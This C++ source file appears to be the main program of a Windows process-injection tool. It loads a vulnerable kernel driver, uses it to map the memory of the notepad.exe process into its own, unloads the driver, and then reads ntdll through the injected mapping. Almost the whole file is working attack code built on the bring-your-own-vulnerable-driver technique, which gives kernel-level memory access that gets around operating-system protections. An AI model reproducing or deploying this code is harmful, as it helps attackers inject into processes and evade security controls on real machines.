#include "vdm_ctx/vdm_ctx.hpp"
#include "mem_ctx/mem_ctx.hpp"
#include "injector_ctx/injector_ctx.hpp"

int __cdecl main(int argc, char** argv)
{
	const auto [drv_handle, drv_key] = vdm::load_drv();
	if (!drv_handle || drv_key.empty())
	{
		std::printf("[!] unable to load vulnerable driver...\n");
		return -1;
	}

	vdm::vdm_ctx vdm;
	nasa::mem_ctx my_proc(vdm);
	nasa::mem_ctx notepad_proc(vdm, util::get_pid("notepad.exe"));
	nasa::injector_ctx injector(&my_proc, &notepad_proc);

	// driver no longer needs to be loaded since paging tables are all setup :^)
	if (!vdm::unload_drv(drv_handle, drv_key))
	{
		std::printf("[!] unable to unload vulnerable driver...\n");
		return -1;
	}

	if (!injector.init())
	{
		std::printf("[!] failed to init injector_ctx...\n");
		return -1;
	}

	const auto ntdll_base = 
		reinterpret_cast<std::uintptr_t>(
			GetModuleHandleA("ntdll.dll"));

	const auto ntdll_inject_addr = injector.translate(ntdll_base);
	std::printf("[+] ntdll base address -> 0x%p\n", ntdll_base);
	std::printf("[+] ntdll reverse inject address -> 0x%p\n", ntdll_inject_addr);
	std::printf("[+] ntdll MZ -> 0x%x\n", *(short*)ntdll_inject_addr);

	std::printf("[+] press any key to close...\n");
	std::getchar();
}